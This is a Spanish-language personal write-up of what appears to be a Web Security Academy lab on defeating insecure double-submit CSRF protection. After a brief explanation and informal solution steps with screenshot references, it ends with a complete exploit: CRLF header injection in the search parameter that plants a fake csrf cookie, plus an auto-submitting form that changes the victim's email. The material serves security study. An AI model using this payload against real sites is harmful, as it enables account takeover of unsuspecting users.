En esta clase explotamos una implementación insegura del sistema de protección CSRF conocido como doble envío de token. El servidor compara el valor del token enviado en el cuerpo del formulario con el valor de una cookie del mismo nombre, pero ambos pueden ser controlados por el atacante.

Para llevar a cabo el ataque, aprovechamos que la funcionalidad de búsqueda del sitio refleja parámetros en la cabecera Set-Cookie. Esto nos permite inyectar una cookie csrf falsa en el navegador de la víctima usando un enlace manipulado.

Después, simplemente construimos un formulario que envía el mismo valor falso en el cuerpo de la petición, y así engañamos al servidor haciéndole creer que la petición es legítima.

Este ataque demuestra por qué el doble envío de token no es una protección fiable si el valor del token puede ser manipulado desde el navegador.

Solucion
hacemos lo mismo nos logeamos intentamos cambiar de correo y pues luego lo interceptamos y lo mandamos al repeater
![[Pasted image 20250723210529.png]]
y bueno aqui vemos que tenemos el mismo csrf token en los 2 lados
aasi que vamos a trastear
![[Pasted image 20250723210745.png]]
ya con esto podemos construir nuestro payload haciendo los pasos en donde vemos el formulario luego copiamos y modificamos 
despues lo que hacemos es ir al la barra de busquedad y poner cualquier cosa y interceptarlo para ver si se puede emplear una nuesva set cookie
![[Pasted image 20250723211345.png]]
es lo mismo me retorna lo mismo
vamos a modificarlo
![[Pasted image 20250723211753.png]]
y el payload queda asi (<form class="login-form" name="change-email-form" action="https://0ab5005d0309bc19802d17e500bd0010.web-security-academy.net/my-account/change-email" method="POST">                          
    <input type="hidden" name="email" value="hola@tenso.com">
    <input required="" type="hidden" name="csrf" value="fake">
</form>

<img src="https://0ab5005d0309bc19802d17e500bd0010.web-security-academy.net/?search=a%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">)
